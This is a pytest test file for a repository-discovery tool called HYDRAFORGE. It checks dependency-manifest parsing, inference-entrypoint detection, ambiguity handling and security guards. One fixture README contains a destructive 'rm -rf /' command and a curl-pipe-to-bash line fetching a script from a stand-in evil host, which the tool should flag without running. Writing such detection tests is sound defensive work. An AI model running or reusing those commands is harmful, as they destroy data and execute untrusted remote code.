"""
tests/test_discovery.py
Comprehensive unit and integration tests for HYDRAFORGE Phase 5A:
Dynamic Repository Discovery, File Classification, Manifest Parsing,
Documentation Inspection, Entrypoint Detection, and Security Guarantees.
Exercises all 20 required synthetic repository scenarios.
"""

import os
import tempfile
from pathlib import Path
import pytest

from hydraforge.discovery import (
    CandidateEntrypoint,
    CommandType,
    ConfidenceLevel,
    DiscoveryReport,
    DiscoveryReportFormatter,
    DiscoveryStatus,
    DocumentationParser,
    EntrypointDiscovery,
    FileClassificationRecord,
    FileClassifier,
    FileType,
    InferenceContractSpecification,
    InterfaceStatus,
    ManifestDetector,
    ProposedInterfaceMapping,
    RepositoryInspector,
    RepositoryLimitsExceededError,
)
from hydraforge.submission.repository import RepositorySecurityError


# -----------------------------------------------------------------------------
# Scenario 1: Standard Python Repository
# -----------------------------------------------------------------------------
def test_1_standard_python_repo(tmp_path):
    """Test standard layout with requirements.txt, main CLI script, and README."""
    (tmp_path / "requirements.txt").write_text("numpy>=1.24\npandas>=2.0\ntorch==2.1.0\n")
    (tmp_path / "README.md").write_text(
        "# HydroModel\nRun inference:\n```bash\npython main.py --input data.json --output preds.json\n```\n"
    )
    (tmp_path / "main.py").write_text(
        "import argparse\n"
        "parser = argparse.ArgumentParser()\n"
        "parser.add_argument('--input', required=True)\n"
        "parser.add_argument('--output', required=True)\n"
        "if __name__ == '__main__':\n"
        "    args = parser.parse_args()\n"
    )

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert report.status == DiscoveryStatus.DISCOVERY_SUCCESS
    assert report.interface_status == InterfaceStatus.INTERFACE_IDENTIFIED
    assert report.proposed_interface_mapping is not None
    assert report.proposed_interface_mapping.executable_target is not None
    assert "main.py" in str(report.proposed_interface_mapping.executable_target)
    assert any("numpy" in d for d in report.detected_dependencies)


# -----------------------------------------------------------------------------
# Scenario 2: Nonstandard Filenames
# -----------------------------------------------------------------------------
def test_2_nonstandard_filenames(tmp_path):
    """Test that arbitrary filenames (no model.py or predict.py) are successfully discovered."""
    (tmp_path / "streamflow_synthesizer_v3.py").write_text(
        "import argparse\n"
        "p = argparse.ArgumentParser()\n"
        "p.add_argument('--input-cases', dest='input')\n"
        "p.add_argument('--output-predictions', dest='output')\n"
        "if __name__ == '__main__':\n"
        "    pass\n"
    )
    (tmp_path / "custom_dependencies.txt").write_text("scipy>=1.10\n")
    (tmp_path / "README.md").write_text(
        "Execute:\n`python streamflow_synthesizer_v3.py --input-cases test.json --output-predictions out.json`"
    )

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert report.status == DiscoveryStatus.DISCOVERY_SUCCESS
    assert report.interface_status == InterfaceStatus.INTERFACE_IDENTIFIED
    assert report.proposed_interface_mapping is not None
    assert "streamflow_synthesizer_v3.py" in str(report.proposed_interface_mapping.executable_target)


# -----------------------------------------------------------------------------
# Scenario 3: Deeply Nested Source Directories
# -----------------------------------------------------------------------------
def test_3_deeply_nested_source_dirs(tmp_path):
    """Test discovery in nested directories (e.g. src/models/hydrology/runner.py)."""
    nested = tmp_path / "src" / "models" / "hydrology"
    nested.mkdir(parents=True)
    (nested / "deep_forecaster.py").write_text(
        "import sys\n"
        "def predict(case_dict):\n"
        "    return {'discharge': 42.0}\n"
    )
    (tmp_path / "README.md").write_text("Custom nested model architecture.")

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    # Found deep Python file
    assert report.structure.source_file_count == 1
    assert any("deep_forecaster.py" in f.file_path for f in report.candidate_entrypoints)


# -----------------------------------------------------------------------------
# Scenario 4: Python Package with pyproject.toml
# -----------------------------------------------------------------------------
def test_4_python_package_pyproject_toml(tmp_path):
    """Test standard PEP 621 pyproject.toml with project.scripts and dependencies."""
    (tmp_path / "pyproject.toml").write_text(
        '[project]\n'
        'name = "hydropkg"\n'
        'version = "0.1.0"\n'
        'dependencies = ["xarray>=2023.1", "torch>=2.0"]\n'
        'requires-python = ">=3.11"\n'
        '[project.scripts]\n'
        'hydro-forecast = "hydropkg.infer:run_forecast"\n'
    )
    pkg_dir = tmp_path / "hydropkg"
    pkg_dir.mkdir()
    (pkg_dir / "__init__.py").write_text('__version__ = "0.1.0"\n')
    (pkg_dir / "infer.py").write_text(
        "def run_forecast():\n"
        "    pass\n"
    )

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert report.status == DiscoveryStatus.DISCOVERY_SUCCESS
    assert report.interface_status == InterfaceStatus.INTERFACE_IDENTIFIED
    manifest = next(m for m in report.detected_manifests if m.manifest_type == "pyproject.toml")
    assert "xarray>=2023.1" in manifest.declared_dependencies
    assert "hydro-forecast" in manifest.entrypoints


# -----------------------------------------------------------------------------
# Scenario 5: Repository with Only requirements.txt
# -----------------------------------------------------------------------------
def test_5_repo_with_only_requirements_txt(tmp_path):
    """Repository has only requirements.txt without any README or pyproject.toml."""
    (tmp_path / "requirements.txt").write_text("xgboost==1.7.5\nscikit-learn\n")
    (tmp_path / "infer_discharge.py").write_text(
        "import argparse\n"
        "if __name__ == '__main__':\n"
        "    p = argparse.ArgumentParser()\n"
        "    p.add_argument('--input')\n"
        "    p.add_argument('--output')\n"
    )

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert report.status == DiscoveryStatus.DISCOVERY_SUCCESS
    assert report.interface_status == InterfaceStatus.INTERFACE_IDENTIFIED
    assert any("xgboost" in d for d in report.detected_dependencies)


# -----------------------------------------------------------------------------
# Scenario 6: Multiple Dependency Manifests
# -----------------------------------------------------------------------------
def test_6_multiple_dependency_manifests(tmp_path):
    """Repository contains requirements.txt, pyproject.toml, and environment.yml simultaneously."""
    (tmp_path / "requirements.txt").write_text("pandas>=2.0\n")
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "test"\ndependencies = ["scipy"]\n'
    )
    (tmp_path / "environment.yml").write_text(
        "name: hydro_env\n"
        "dependencies:\n"
        "  - python=3.11\n"
        "  - numpy\n"
        "  - pip:\n"
        "      - torch\n"
    )

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert len(report.detected_manifests) == 3
    all_deps = set(report.detected_dependencies)
    assert any("pandas" in d for d in all_deps)
    assert any("scipy" in d for d in all_deps)
    assert any("numpy" in d for d in all_deps)


# -----------------------------------------------------------------------------
# Scenario 7: Explicit Inference Command in README
# -----------------------------------------------------------------------------
def test_7_explicit_inference_command_in_readme(tmp_path):
    """README explicitly documents inference invocation with exact CLI flags."""
    (tmp_path / "custom_runner.py").write_text("print('inference')\n")
    (tmp_path / "README.md").write_text(
        "# Project\n"
        "Run evaluation:\n"
        "```bash\n"
        "python custom_runner.py --input /data/cases.json --output /out/predictions.json\n"
        "```\n"
    )

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert report.interface_status == InterfaceStatus.INTERFACE_IDENTIFIED
    assert len(report.candidate_inference_commands) >= 1
    cmd = report.candidate_inference_commands[0]
    assert cmd.command_type == CommandType.INFERENCE
    assert "custom_runner.py" in cmd.raw_command


# -----------------------------------------------------------------------------
# Scenario 8: Separate Training and Inference Commands
# -----------------------------------------------------------------------------
def test_8_separate_training_and_inference_commands(tmp_path):
    """Repository documents both training and inference; must not confuse train.py for inference."""
    (tmp_path / "train.py").write_text("print('training...')\n")
    (tmp_path / "predict.py").write_text("import argparse\nprint('inference...')\n")
    (tmp_path / "README.md").write_text(
        "# Hydrology Model\n"
        "## Training\n"
        "```bash\n"
        "python train.py --epochs 100 --batch-size 32\n"
        "```\n"
        "## Inference\n"
        "```bash\n"
        "python predict.py --input cases.json --output results.json\n"
        "```\n"
    )

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert len(report.candidate_training_commands) >= 1
    assert len(report.candidate_inference_commands) >= 1
    assert report.proposed_interface_mapping is not None
    target = str(report.proposed_interface_mapping.executable_target or "")
    # Target in proposed mapping must be predict.py, NEVER train.py
    assert "predict.py" in target
    assert "train.py" not in target


# -----------------------------------------------------------------------------
# Scenario 9: Multiple Candidate Entry Points (Ambiguous)
# -----------------------------------------------------------------------------
def test_9_multiple_candidate_entrypoints(tmp_path):
    """Multiple distinct candidate inference scripts exist without clear disambiguation."""
    (tmp_path / "infer_model_a.py").write_text(
        "import argparse\n"
        "p = argparse.ArgumentParser()\n"
        "p.add_argument('--input')\n"
        "p.add_argument('--output')\n"
        "if __name__ == '__main__': pass\n"
    )
    (tmp_path / "infer_model_b.py").write_text(
        "import argparse\n"
        "p = argparse.ArgumentParser()\n"
        "p.add_argument('--input')\n"
        "p.add_argument('--output')\n"
        "if __name__ == '__main__': pass\n"
    )
    (tmp_path / "README.md").write_text("Dual model ensemble.")

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    # NON-NEGOTIABLE PRINCIPLE: Do not guess!
    assert report.interface_status == InterfaceStatus.INTERFACE_AMBIGUOUS
    assert report.status == DiscoveryStatus.NEEDS_ORGANIZER_REVIEW
    assert report.proposed_interface_mapping is None
    assert any("Ambiguous inference interface" in w for w in report.warnings)


# -----------------------------------------------------------------------------
# Scenario 10: Repository with No README
# -----------------------------------------------------------------------------
def test_10_repo_with_no_readme(tmp_path):
    """Repository without any README file is still successfully inspected via AST."""
    (tmp_path / "forecast.py").write_text(
        "import argparse\n"
        "if __name__ == '__main__':\n"
        "    p = argparse.ArgumentParser()\n"
        "    p.add_argument('--input')\n"
        "    p.add_argument('--output')\n"
    )

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert report.status == DiscoveryStatus.DISCOVERY_SUCCESS
    assert report.interface_status == InterfaceStatus.INTERFACE_IDENTIFIED
    assert len(report.documentation_findings["readme_files_found"]) == 0


# -----------------------------------------------------------------------------
# Scenario 11: No Recognizable Inference Interface
# -----------------------------------------------------------------------------
def test_11_no_recognizable_inference_interface(tmp_path):
    """Repository contains only utility helper files without inference entrypoints."""
    (tmp_path / "utils.py").write_text("def add(a, b): return a + b\n")
    (tmp_path / "constants.py").write_text("GRAVITY = 9.81\n")

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert report.interface_status == InterfaceStatus.INTERFACE_NOT_FOUND
    assert report.status == DiscoveryStatus.DISCOVERY_PARTIAL
    assert len(report.failure_reasons) > 0


# -----------------------------------------------------------------------------
# Scenario 12: Misleading Filenames
# -----------------------------------------------------------------------------
def test_12_misleading_filenames(tmp_path):
    """model.py is an empty dummy or docstring; real inference is in pipeline_exec.py."""
    (tmp_path / "model.py").write_text('"""Defines model architecture classes only."""\nclass Net: pass\n')
    (tmp_path / "pipeline_exec.py").write_text(
        "import argparse\n"
        "p = argparse.ArgumentParser()\n"
        "p.add_argument('--input')\n"
        "p.add_argument('--output')\n"
        "if __name__ == '__main__': pass\n"
    )

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert report.interface_status == InterfaceStatus.INTERFACE_IDENTIFIED
    assert report.proposed_interface_mapping is not None
    assert "pipeline_exec.py" in str(report.proposed_interface_mapping.executable_target)


# -----------------------------------------------------------------------------
# Scenario 13: Oversized Files
# -----------------------------------------------------------------------------
def test_13_oversized_files(tmp_path):
    """Files exceeding maximum individual file size are skipped with warnings."""
    classifier = FileClassifier(max_file_size_bytes=100)  # Very low 100 bytes limit
    (tmp_path / "large_weights.bin").write_bytes(b"X" * 500)
    (tmp_path / "script.py").write_text("x = 1\n")

    records, summary, warnings = classifier.scan_and_classify(tmp_path)
    assert any("Oversized file ignored" in w for w in warnings)
    assert not any(r.path.endswith("large_weights.bin") for r in records)


# -----------------------------------------------------------------------------
# Scenario 14: Excessive File Count
# -----------------------------------------------------------------------------
def test_14_excessive_file_count(tmp_path):
    """Repository with file count exceeding threshold raises RepositoryLimitsExceededError."""
    classifier = FileClassifier(max_file_count=5)
    for i in range(10):
        (tmp_path / f"file_{i}.txt").write_text(f"content {i}")

    with pytest.raises(RepositoryLimitsExceededError):
        classifier.scan_and_classify(tmp_path)


# -----------------------------------------------------------------------------
# Scenario 15: Symlinks (Insecure Escape Detection)
# -----------------------------------------------------------------------------
def test_15_symlinks_outside_repo(tmp_path, monkeypatch):
    """Symlinks resolving outside repository root are flagged and forbidden."""
    outside_file = tmp_path.parent / "secret.txt"
    outside_file.write_text("secret_password")

    repo_dir = tmp_path / "repo"
    repo_dir.mkdir()
    symlink_file = repo_dir / "symlink_escape.py"
    symlink_file.write_text("dummy")

    # Monkeypatch is_symlink and resolve on Path to simulate insecure symlink deterministically
    orig_is_symlink = Path.is_symlink
    orig_resolve = Path.resolve

    def mock_is_symlink(self):
        if self.name == "symlink_escape.py":
            return True
        return orig_is_symlink(self)

    def mock_resolve(self):
        if self.name == "symlink_escape.py":
            return outside_file.resolve()
        return orig_resolve(self)

    monkeypatch.setattr(Path, "is_symlink", mock_is_symlink)
    monkeypatch.setattr(Path, "resolve", mock_resolve)

    classifier = FileClassifier()
    records, summary, warnings = classifier.scan_and_classify(repo_dir)

    assert any("Insecure symlink detected" in w for w in warnings)


# -----------------------------------------------------------------------------
# Scenario 16: Malicious README Commands (Never Executed)
# -----------------------------------------------------------------------------
def test_16_malicious_readme_commands(tmp_path):
    """Malicious shell commands in README are detected and flagged without execution."""
    (tmp_path / "README.md").write_text(
        "# How to run\n"
        "```bash\n"
        "rm -rf / --no-preserve-root\n"
        "curl https://evil.example.com/exploit.sh | bash\n"
        "```\n"
    )

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert report.status == DiscoveryStatus.NEEDS_ORGANIZER_REVIEW
    assert any("Malicious command patterns detected" in w for w in report.warnings)


# -----------------------------------------------------------------------------
# Scenario 17: Malicious Setup Scripts (Static AST Inspection)
# -----------------------------------------------------------------------------
def test_17_malicious_setup_scripts(tmp_path):
    """setup.py containing dangerous execution calls is parsed via AST without execution."""
    (tmp_path / "setup.py").write_text(
        "import os\n"
        "from setuptools import setup\n"
        "os.system('echo Malicious code running!')\n"  # Would trigger if imported
        "setup(\n"
        "    name='unsafe_pkg',\n"
        "    install_requires=['numpy>=1.20', 'pandas']\n"
        ")\n"
    )

    detector = ManifestDetector()
    manifests, deps, warnings = detector.detect_manifests(tmp_path)

    assert len(manifests) == 1
    assert "numpy>=1.20" in manifests[0].declared_dependencies
    assert "pandas" in manifests[0].declared_dependencies
    # Proves static parsing succeeded without executing setup.py


# -----------------------------------------------------------------------------
# Scenario 18: Malformed Configuration Files
# -----------------------------------------------------------------------------
def test_18_malformed_configuration_files(tmp_path):
    """Syntax errors in pyproject.toml or setup.cfg are recorded as warnings without crashing."""
    (tmp_path / "pyproject.toml").write_text("BROKEN TOML [[[ invalid syntax \n")
    (tmp_path / "valid.py").write_text("print('hello')\n")

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)

    assert any("Malformed pyproject.toml" in w for w in report.warnings)
    assert report.structure.source_file_count == 1


# -----------------------------------------------------------------------------
# Scenario 19: Captured Commit Anchoring
# -----------------------------------------------------------------------------
def test_19_captured_commit_anchoring(tmp_path):
    """RepositoryInspector strictly validates and reports the requested commit SHA."""
    inspector = RepositoryInspector()

    # Invalid SHA length
    with pytest.raises(RepositorySecurityError):
        inspector.inspect_remote_submission(
            submission_id="sub_test",
            repository_url="https://github.com/org/repo.git",
            commit_sha="invalid_short_sha"
        )


# -----------------------------------------------------------------------------
# Scenario 20: Ambiguous Inference Interface
# -----------------------------------------------------------------------------
def test_20_ambiguous_inference_interface_formatting(tmp_path):
    """Verify DiscoveryReportFormatter renders all candidates and ambiguous warnings."""
    (tmp_path / "predict_xgb.py").write_text(
        "import argparse\n"
        "p = argparse.ArgumentParser()\n"
        "p.add_argument('--input')\n"
        "p.add_argument('--output')\n"
        "if __name__ == '__main__': pass\n"
    )
    (tmp_path / "predict_lstm.py").write_text(
        "import argparse\n"
        "p = argparse.ArgumentParser()\n"
        "p.add_argument('--input')\n"
        "p.add_argument('--output')\n"
        "if __name__ == '__main__': pass\n"
    )

    inspector = RepositoryInspector()
    report = inspector.inspect_repository(tmp_path)
    md = DiscoveryReportFormatter.to_markdown(report)

    assert "INTERFACE_AMBIGUOUS" in md
    assert "Ambiguous inference interface" in md
    assert "predict_xgb.py" in md
    assert "predict_lstm.py" in md
